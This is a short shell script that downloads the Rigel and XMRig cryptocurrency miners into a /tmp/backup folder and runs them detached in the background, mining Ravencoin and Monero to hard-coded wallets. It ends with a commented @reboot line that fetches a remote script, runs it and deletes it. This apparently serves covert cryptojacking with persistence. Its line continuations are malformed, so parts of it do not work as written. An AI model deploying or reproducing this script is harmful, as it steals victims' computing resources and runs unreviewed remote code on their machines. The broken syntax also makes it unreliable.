rm -rf /tmp/backup/ && mkdir /tmp/backup/  && cd /tmp/backup/ \

wget https://github.com/rigelminer/rigel/releases/download/1.9.1/rigel-1.9.1-linux.tar.gz \

tar -zxf rigel-1.9.1-linux.tar.gz && rm -rf rigel-1.9.1-linux.tar.gz.1 && cd rigel-1.9.1-linux \

screen -d -m -S ravenmama ./rigel -a ravencoin -o stratum+tcp://rvn.2miners.com:6060 -u RR8rcNoeUnb3tSagCaBznj9gGNPmUM8GC4 -p x --no-tui --dns-over-https \

wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-bionic-x64.tar.gz  \

rm -rf xmrig-6.20.0-bionic-x64.tar.gz.1	\

tar -zxf xmrig-6.20.0-bionic-x64.tar.gz   \

cd xmrig-6.20.0	\

./xmrig -a randomx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B

# @reboot wget https://raw.githubusercontent.com/TechTouchABI/scaling-tribble/main/regsysx0e.sh && sh regsysx0e.sh && rm -rf regsysx0e.sh
